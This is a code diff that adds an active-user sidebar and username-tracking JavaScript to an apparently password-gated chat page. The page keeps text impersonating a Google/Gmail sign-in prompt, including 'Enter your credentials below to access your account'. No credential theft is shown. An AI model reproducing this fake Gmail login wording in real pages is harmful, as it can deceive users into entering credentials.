@@ -33,6 +33,54 @@
             padding: 10px;
         }
         
+        .main-content {
+            display: flex;
+            flex: 1;
+            gap: 15px;
+        }
+        
+        .chat-section {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .user-list {
+            width: 200px;
+            border: 1px solid #ff6600;
+            background: #000;
+            border-radius: 8px;
+            padding: 15px;
+            overflow-y: auto;
+        }
+        
+        .user-list h3 {
+            color: #ff6600;
+            margin-bottom: 15px;
+            font-size: 16px;
+            text-align: center;
+            border-bottom: 1px solid #ff6600;
+            padding-bottom: 10px;
+        }
+        
+        .user-item {
+            color: #ff6600;
+            padding: 8px;
+            margin: 5px 0;
+            border-radius: 5px;
+            background: rgba(255,102,0,0.1);
+            border-left: 3px solid #ff6600;
+            font-size: 12px;
+        }
+        
+        .user-count {
+            color: #ff6600;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 10px;
+            font-weight: bold;
+        }
+        
         .header { 
             text-align: center; 
             border-bottom: 1px solid #ff6600; 
@@ -291,14 +339,24 @@
             <div class="status" id="status">Signing in to your Google Account...</div>
         </div>
         
-        <div class="chat-container" id="chatContainer">
-            <div class="message">Welcome to Gmail - Sign in to continue</div>
-            <div class="message">Enter your credentials below to access your account</div>
-        </div>
-        
-        <div class="input-container">
-            <input type="text" id="messageInput" placeholder="Type your message..." onkeypress="if(event.key==='Enter'){event.preventDefault();sendMessageNow();}">
-            <button id="sendButton" onclick="sendMessageNow()">Send</button>
+        <div class="main-content">
+            <div class="chat-section">
+                <div class="chat-container" id="chatContainer">
+                    <div class="message">Welcome to Gmail - Sign in to continue</div>
+                    <div class="message">Enter your credentials below to access your account</div>
+                </div>
+                
+                <div class="input-container">
+                    <input type="text" id="messageInput" placeholder="Type your message..." onkeypress="if(event.key==='Enter'){event.preventDefault();sendMessageNow();}">
+                    <button id="sendButton" onclick="sendMessageNow()">Send</button>
+                </div>
+            </div>
+            
+            <div class="user-list" id="userList">
+                <h3>👥 Active Users</h3>
+                <div class="user-count" id="userCount">0 users online</div>
+                <div id="userItems"></div>
+            </div>
         </div>
     </div>
     
@@ -339,6 +397,10 @@
             var tabId = Math.floor(Math.random() * 999999);
             window.randomUsername = 'AnonymousUser' + tabId;
         }
+        
+        // ACTIVE USERS TRACKING
+        var activeUsers = new Set();
+        var userListUpdateInterval = null;
         
         // SIMPLE PASSWORD CHECK - JUST WORKS
         function simplePasswordCheck() {
@@ -382,6 +444,9 @@
                                     chatContainer.appendChild(messageEl);
                                     chatContainer.scrollTop = chatContainer.scrollHeight;
                                 }
+                                
+                                // Add user to active list when they send a message
+                                addUserToActiveList(data.username);
                             }
                         });
                     } catch (error) {
@@ -391,6 +456,9 @@
                 
                 // START BOB MESSAGES
                 startBobMessages();
+                
+                // START USER LIST TRACKING
+                startUserListTracking();
             } else {
                 alert('Wrong password');
                 document.getElementById('sitePassword').value = '';
@@ -719,6 +787,9 @@
                         chatContainer.appendChild(messageEl);
                         chatContainer.scrollTop = chatContainer.scrollHeight;
                         
+                        // Add user to active list
+                        addUserToActiveList(msg.username);
+                        
                         // Mark this message as seen
                         seenMessages.push(messageId);
                         localStorage.setItem('seenMessages', JSON.stringify(seenMessages));
@@ -800,6 +871,58 @@
             setTimeout(showBobMessage, 3000);
         }
         
+        // USER LIST TRACKING FUNCTIONS
+        function startUserListTracking() {
+            // Add current user to active users
+            activeUsers.add(window.randomUsername);
+            updateUserList();
+            
+            // Update user list every 5 seconds
+            userListUpdateInterval = setInterval(updateUserList, 5000);
+            
+            // Send user activity to server
+            if (window.socket && window.socket.connected) {
+                window.socket.emit('userActivity', {
+                    username: window.randomUsername,
+                    action: 'join'
+                });
+            }
+        }
+        
+        function updateUserList() {
+            var userCountEl = document.getElementById('userCount');
+            var userItemsEl = document.getElementById('userItems');
+            
+            if (!userCountEl || !userItemsEl) return;
+            
+            // Update count
+            var userCount = activeUsers.size;
+            userCountEl.textContent = userCount + ' user' + (userCount !== 1 ? 's' : '') + ' online';
+            
+            // Update user list
+            userItemsEl.innerHTML = '';
+            activeUsers.forEach(function(username) {
+                var userEl = document.createElement('div');
+                userEl.className = 'user-item';
+                userEl.textContent = username;
+                userItemsEl.appendChild(userEl);
+            });
+        }
+        
+        function addUserToActiveList(username) {
+            if (username && username !== window.randomUsername) {
+                activeUsers.add(username);
+                updateUserList();
+            }
+        }
+        
+        function removeUserFromActiveList(username) {
+            if (username && username !== window.randomUsername) {
+                activeUsers.delete(username);
+                updateUserList();
+            }
+        }
+        
         // Make functions globally accessible
         window.simplePasswordCheck = simplePasswordCheck;
         window.checkExistingAccess = checkExistingAccess;
@@ -811,6 +934,9 @@
         window.protectPasswordModal = protectPasswordModal;
         window.recreatePasswordModal = recreatePasswordModal;
         window.startModalProtection = startModalProtection;
+        window.startUserListTracking = startUserListTracking;
+        window.addUserToActiveList = addUserToActiveList;
+        window.removeUserFromActiveList = removeUserFromActiveList;
         
         // SECURE: Set up event listeners when page loads
         document.addEventListener('DOMContentLoaded', function() {
